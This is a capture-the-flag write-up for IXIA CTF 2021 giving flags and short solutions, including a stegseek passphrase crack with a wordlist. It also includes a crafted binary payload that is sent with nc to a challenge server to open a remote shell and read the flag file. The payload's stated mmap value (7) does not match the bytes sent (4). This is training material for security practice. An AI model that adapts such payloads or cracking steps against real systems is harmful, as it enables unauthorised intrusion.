# IXIA CTF 2021 - https://acs-ixia-ctf.security.cs.pub.ro/home


## Misc

### Warm-up - ACS_IXIA_CTF{Welcome_to_the_IXIA_2021_CTF_Have_Fun!}

Just go to the Discord server and run `?join_role_3e4a3b455cb7789`.

### Beware the Hackerman - ACS_IXIA_CTF{STEGANOGRAPHY_IS_FUN}

Run `strings hackerman.gif` and find the following base64 encrypted string:
`QUNTX0lYSUFfQ1RGe1NURUdBTk9HUkFQSFlfSVNfRlVOfQ==`.
Decode it using `https://www.base64decode.org/`.

### Step by step - ACS_IXIA_CTF{CH4R_BY_CH4R_4ND_H3R3S_Y0UR_FL4G}

Connect using `telnet 141.85.224.109 31339`, then copy paste the commands from
`commands.txt`. The output was copied in `chars.txt`.

### Yo Dawg! - ACS_IXIA_CTF{Y0_D4WG_G00D_J0B}

Use `stegseek` to find the passphrase and the hidden file which contains the
flag.

```
stegseek yo-dawg.jpg rockyou.txt 
StegSeek version 0.5
Progress: 0.00% (0 bytes)           

[i] --> Found passphrase: "asdfjkl"
[i] Original filename: "flag"
[i] Extracting to "yo-dawg.jpg.out"
```

## Reverse

### Santa's Elf - ACS_IXIA_CTF{not_the_elf_you_were_thinking_about}

The payload is the following:
- 4 bytes from DAT_00100ad8 (ELF header, 0x00-0x03);
- 20 random bytes (0x04 - 0x17);
- 0x0000deadbeef (0x18 - 0x1f);
- 16 random bytes (0x20 - 0x2f);
- 7 (PROT_EXEC|PROT_WRITE|PROT_READ for mmap, 0x30 - 0x39).

Then build the payload and send it to the server in order to open a remote shell:
```
python2 -c 'print "\x7f\x45\x4c\x46" + "A" * 20 + "\xef\xbe\xad\xde" + "\x00" * 4 + "A" * 16 + "\x04\x00\x00\x00"' > payload
cat payload - | nc 141.85.224.118 31337
cat /home/ctf/flag
ACS_IXIA_CTF{not_the_elf_you_were_thinking_about}
```
